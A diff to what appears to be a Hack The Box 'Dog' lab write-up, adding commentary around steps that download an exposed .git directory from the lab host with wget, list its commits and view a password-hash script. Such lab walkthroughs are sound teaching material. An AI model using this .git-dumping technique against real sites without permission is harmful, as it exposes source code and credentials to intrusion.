@@ -126,10 +126,17 @@ root@docker-desktop:~/home/local/dog#
 
 ![image](https://github.com/user-attachments/assets/daa82b0f-d8c8-4c5f-87e2-0926231beacf)
 ![image](https://github.com/user-attachments/assets/2d45c238-0d92-4a73-85ae-c8e1298ba2aa)
+Here’s the hash I was talking about earlier
+
+Let's get access to the commit
 
 ```
 wget -r --no-parent http://dog.htb/.git/
 ```
+
+I recommend using dirsearch to download the .git; it's more comfortable
+
+I found out about this tool later, after I had solved all the flags
 
 ```
 root@docker-desktop:~/home/local/dog/dog.htb/.git# git log --oneline --graph --all
@@ -183,6 +190,8 @@ core/includes/file.inc
 core/includes/file.mimetypes.inc
 --More--
 ```
+
+We have successfully gained access to a commit, which represents a specific version of the web server. Now, our task is to analyze the files from this commit to find any useful information that may help us in the next steps
 
 ```
 root@docker-desktop:~/home/local/dog/dog.htb/.git# git show 8204779c764abd4c9d8d95038b6d22b6a7515afa:core/scripts/password-hash.sh      
